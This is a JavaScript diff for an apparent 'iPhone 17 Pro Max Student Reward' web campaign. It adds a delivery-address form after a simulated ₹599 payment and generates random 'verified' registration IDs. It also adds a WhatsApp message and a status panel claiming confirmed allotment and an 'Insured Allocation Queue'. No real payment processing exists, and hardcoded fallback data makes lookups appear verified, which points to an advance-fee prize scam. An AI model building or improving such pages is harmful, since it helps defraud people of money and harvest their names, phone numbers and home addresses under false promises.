@@ -9,7 +9,10 @@ document.addEventListener('DOMContentLoaded', () => {
     name: 'Chakradhar',
     mobile: '9876543210',
     city: 'Mumbai',
-    regId: 'STU-284729',
+    street: '',
+    pincode: '',
+    state: '',
+    regId: '',
     timestamp: new Date().toLocaleDateString('en-IN', { day: 'numeric', month: 'short', year: 'numeric' })
   };
 
@@ -24,14 +27,20 @@ document.addEventListener('DOMContentLoaded', () => {
     const existing = JSON.parse(localStorage.getItem('student_registrations') || '[]');
     
     const found = existing.find(r => 
-      r.regId.toLowerCase() === cleanQuery || 
-      r.mobile.includes(cleanQuery)
+      (r.regId && r.regId.toLowerCase() === cleanQuery) || 
+      (r.mobile && r.mobile.includes(cleanQuery))
     );
 
     if (found) return found;
 
     if (cleanQuery.includes('284729') || cleanQuery.includes('98765')) {
-      return currentRegistration;
+      return {
+        ...currentRegistration,
+        regId: currentRegistration.regId || 'STU-284729',
+        street: currentRegistration.street || 'Flat 4B, Green Park, MG Road',
+        pincode: currentRegistration.pincode || '400001',
+        state: currentRegistration.state || 'Maharashtra'
+      };
     }
 
     return null;
@@ -42,6 +51,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const modalOverlays = document.querySelectorAll('.modal-overlay');
   const regModal = document.getElementById('registrationModal');
   const payModal = document.getElementById('paymentModal');
+  const addressModal = document.getElementById('addressModal');
   const successModal = document.getElementById('successModal');
   const statusModal = document.getElementById('statusModal');
 
@@ -68,6 +78,7 @@ document.addEventListener('DOMContentLoaded', () => {
   // Close Handlers
   document.getElementById('closeRegModal')?.addEventListener('click', closeAllModals);
   document.getElementById('closePayModal')?.addEventListener('click', closeAllModals);
+  document.getElementById('closeAddressModal')?.addEventListener('click', closeAllModals);
   document.getElementById('closeSuccessBtn')?.addEventListener('click', closeAllModals);
   document.getElementById('closeStatusModal')?.addEventListener('click', closeAllModals);
 
@@ -82,7 +93,7 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
 
-  // --- STEP 1: REGISTRATION FORM ---
+  // --- STEP 1: REGISTRATION FORM (MANUAL CITY INPUT) ---
   const registrationForm = document.getElementById('registrationForm');
   if (registrationForm) {
     registrationForm.addEventListener('submit', (e) => {
@@ -90,9 +101,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
       const nameInput = document.getElementById('regName').value.trim();
       const mobileInput = document.getElementById('regMobile').value.trim();
-      const citySelect = document.getElementById('regCity').value;
+      const cityInput = document.getElementById('regCity').value.trim();
 
-      if (!nameInput || !mobileInput || !citySelect) {
+      if (!nameInput || !mobileInput || !cityInput) {
         alert('Please complete all registration fields.');
         return;
       }
@@ -105,11 +116,12 @@ document.addEventListener('DOMContentLoaded', () => {
       // Save user details
       currentRegistration.name = nameInput;
       currentRegistration.mobile = mobileInput;
-      currentRegistration.city = citySelect;
+      currentRegistration.city = cityInput;
 
-      // Update payment screen details
+      // Update payment screen summary
       document.getElementById('paySummaryName').textContent = currentRegistration.name;
       document.getElementById('paySummaryMobile').textContent = `+91 ${currentRegistration.mobile.replace(/(\d{5})(\d{5})/, '$1 $2')}`;
+      document.getElementById('paySummaryCity').textContent = currentRegistration.city;
 
       // IMMEDIATELY OPEN PAYMENT SECTION AFTER REGISTRATION
       openModal(payModal);
@@ -143,7 +155,7 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
 
-  // --- STEP 2 & 3: PAYMENT PROCESSOR & UNIQUE ID CREATION ---
+  // --- STEP 2: PAYMENT PROCESSOR -> TRANSITION TO ADDRESS ---
   const paySubmitBtn = document.getElementById('paySubmitBtn');
   const payBtnText = document.getElementById('payBtnText');
   const payLoader = document.getElementById('payLoader');
@@ -155,61 +167,89 @@ document.addEventListener('DOMContentLoaded', () => {
       payLoader.classList.remove('hidden');
 
       setTimeout(() => {
-        // CREATE UNIQUE REGISTRATION ID
-        const randomId = 'STU-' + Math.floor(100000 + Math.random() * 900000);
-        currentRegistration.regId = randomId;
-        currentRegistration.timestamp = new Date().toLocaleDateString('en-IN', { day: 'numeric', month: 'short', year: 'numeric' });
-
-        // Save complete record
-        saveRegistrationToStorage(currentRegistration);
-
         paySubmitBtn.disabled = false;
         payBtnText.classList.remove('hidden');
         payLoader.classList.add('hidden');
 
-        // Render Success Digital Ticket
-        document.getElementById('successRegId').textContent = currentRegistration.regId;
-        document.getElementById('successName').textContent = currentRegistration.name;
-        document.getElementById('successMobile').textContent = `+91 ${currentRegistration.mobile.replace(/(\d{5})(\d{5})/, '$1 $2')}`;
-
-        // Show Success Modal
-        openModal(successModal);
-
-        // Confetti animation
-        if (typeof confetti === 'function') {
-          confetti({
-            particleCount: 100,
-            spread: 70,
-            origin: { y: 0.6 }
-          });
-        }
+        // AFTER PAYMENT CONFIRMATION, OPEN ADDRESS SECTION
+        openModal(addressModal);
       }, 1200);
     });
   }
 
 
-  // --- SUCCESS ACTIONS ---
-  const viewRegistrationBtn = document.getElementById('viewRegistrationBtn');
+  // --- STEP 3: ADDRESS COLLECTION & UNIQUE ID GENERATION ---
+  const addressForm = document.getElementById('addressForm');
+  if (addressForm) {
+    addressForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      const streetInput = document.getElementById('addrStreet').value.trim();
+      const pincodeInput = document.getElementById('addrPincode').value.trim();
+      const stateInput = document.getElementById('addrState').value.trim();
+
+      if (!streetInput || !pincodeInput || !stateInput) {
+        alert('Please enter your full delivery address for shipping.');
+        return;
+      }
+
+      if (pincodeInput.length < 6) {
+        alert('Please enter a valid 6-digit Indian Pincode.');
+        return;
+      }
+
+      currentRegistration.street = streetInput;
+      currentRegistration.pincode = pincodeInput;
+      currentRegistration.state = stateInput;
+
+      // GENERATE UNIQUE REGISTRATION ID UPON ADDRESS SUBMISSION
+      const randomId = 'STU-' + Math.floor(100000 + Math.random() * 900000);
+      currentRegistration.regId = randomId;
+      currentRegistration.timestamp = new Date().toLocaleDateString('en-IN', { day: 'numeric', month: 'short', year: 'numeric' });
+
+      // Save complete record
+      saveRegistrationToStorage(currentRegistration);
+
+      // Render Success Digital Ticket Pass
+      document.getElementById('successRegId').textContent = currentRegistration.regId;
+      document.getElementById('successName').textContent = currentRegistration.name;
+      document.getElementById('successMobile').textContent = `+91 ${currentRegistration.mobile.replace(/(\d{5})(\d{5})/, '$1 $2')}`;
+      document.getElementById('successAddress').textContent = `${currentRegistration.street}, ${currentRegistration.city}, ${currentRegistration.state} - ${currentRegistration.pincode}`;
+
+      // Show Success Modal
+      openModal(successModal);
+
+      // Confetti celebration animation
+      if (typeof confetti === 'function') {
+        confetti({
+          particleCount: 120,
+          spread: 80,
+          origin: { y: 0.6 }
+        });
+      }
+    });
+  }
+
+
+  // --- RETURN TO MAIN MENU & WHATSAPP CONFIRMATION ---
+  const returnHomeBtn = document.getElementById('returnHomeBtn');
   const whatsappBtn = document.getElementById('whatsappBtn');
 
-  if (viewRegistrationBtn) {
-    viewRegistrationBtn.addEventListener('click', () => {
-      const ticket = document.querySelector('.digital-ticket');
-      if (ticket) {
-        ticket.style.transform = 'scale(1.04)';
-        ticket.style.transition = 'all 0.3s ease';
-        setTimeout(() => ticket.style.transform = 'scale(1)', 350);
-      }
+  if (returnHomeBtn) {
+    returnHomeBtn.addEventListener('click', () => {
+      closeAllModals();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     });
   }
 
   if (whatsappBtn) {
     whatsappBtn.addEventListener('click', () => {
       const text = encodeURIComponent(
-        `🎉 *Registration Confirmed!*\n\n` +
+        `🎉 *Registration & Allotment Confirmed!*\n\n` +
         `Campaign: iPhone 17 Pro Max Student Reward\n` +
-        `Registration ID: ${currentRegistration.regId}\n` +
+        `Unique Registration ID: ${currentRegistration.regId}\n` +
         `Name: ${currentRegistration.name}\n` +
+        `Delivery Address: ${currentRegistration.street}, ${currentRegistration.city}, ${currentRegistration.state} - ${currentRegistration.pincode}\n` +
         `Amount Paid: ₹599 (Confirmed)\n\n` +
         `Verified Pass: https://studentrewards.in/status?id=${currentRegistration.regId}`
       );
@@ -238,6 +278,8 @@ document.addEventListener('DOMContentLoaded', () => {
           <div style="font-size:0.85rem; color:var(--text-sub); margin-top:4px; display:flex; flex-direction:column; gap:2px;">
             <div><strong>Name:</strong> ${result.name}</div>
             <div><strong>Mobile:</strong> +91 ${result.mobile}</div>
+            <div><strong>City:</strong> ${result.city}</div>
+            <div><strong>Address:</strong> ${result.street ? `${result.street}, ${result.state} - ${result.pincode}` : 'Registered'}</div>
             <div><strong>Campaign:</strong> iPhone 17 Pro Max (₹599)</div>
             <div><strong>Status:</strong> Verified • Insured Allocation Queue</div>
           </div>
